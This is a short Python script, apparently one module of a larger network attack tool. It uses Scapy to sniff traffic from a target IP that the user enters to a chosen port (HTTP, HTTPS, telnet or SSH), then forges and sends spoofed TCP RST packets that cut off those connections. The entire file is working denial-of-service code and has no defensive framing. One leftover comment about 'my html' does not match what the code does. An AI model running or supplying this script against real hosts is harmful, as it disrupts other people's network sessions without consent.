#!/usr/bin/env python3

from scapy.all import *
import binascii

class tcp_reset:
	def attack(dport):
		victim_ip = input("Enter Target IP: ")
		try:
			print("Sniffing for source and resetting connections")	
			sniff(iface='Ethernet0', lfilter=lambda x: x.haslayer(TCP) and x[IP].src == victim_ip and x[IP].dport == dport, prn = tcp_reset.auto_rst_conn)

		except Exception as e:
			print(e)
			input("Press any key to coninue...")
		except KeyboardInterrupt:
			print ("Ended reset attack")
			input("Press any key to continue...")
	
	def auto_rst_conn(t):
		win = 512
		ip_total_len = t[IP].len
		ip_header_len = t[IP].ihl * 32 / 8
		tcp_header_len = t[IP].dataofs * 32 / 8
		tcp_seg_len = ip_total_len - ip_header_len - tcp_header_len
		#reverse flow to be from server to client
		Ether_Packet = Ether()
		Ether_Packet.src=t[Ether].dst
		Ether_Packet.dst=t[Ether].src
		IP_Packet = IP()
		IP_Packet.src = t[IP].dst
		IP_Packet.dst = t[IP].src
		TCP_Packet = TCP()	
		# from destination port
		TCP_Packet.sport = int(t[TCP].dport)
		# to originating port
		TCP_Packet.dport = int(t[TCP].sport)
		TCP_Packet.seq = int(t[TCP].ack)
		#TCP_Packet.seq = int(t[TCP].seq + tcp_seg_len)
		TCP_Packet.ack = int(t[TCP].seq + 1)
		TCP_Packet.flags ="R"
		TCP_Packet.window = win
		reset_packet = Ether_Packet/ IP_Packet / TCP_Packet  # forge response packet with my html in it
		print('Spoofed Response: ' + str(reset_packet[IP].src) + ':' + str(reset_packet[TCP].sport) + '->' + str(reset_packet[IP].dst) + ':' + str(reset_packet[TCP].dport))
		sendp(reset_packet) # send spoofed response


	def execute(attack):
		if attack == str(1): # http
			tcp_reset.attack(80)
		
		elif attack == str(2): # https
			tcp_reset.attack(443)

		elif attack == str(3): # telnet
			tcp_reset.attack(23) 

		elif attack == str(4): # ssh
			tcp_reset.attack(22)
		else:
			print("Invalid option")
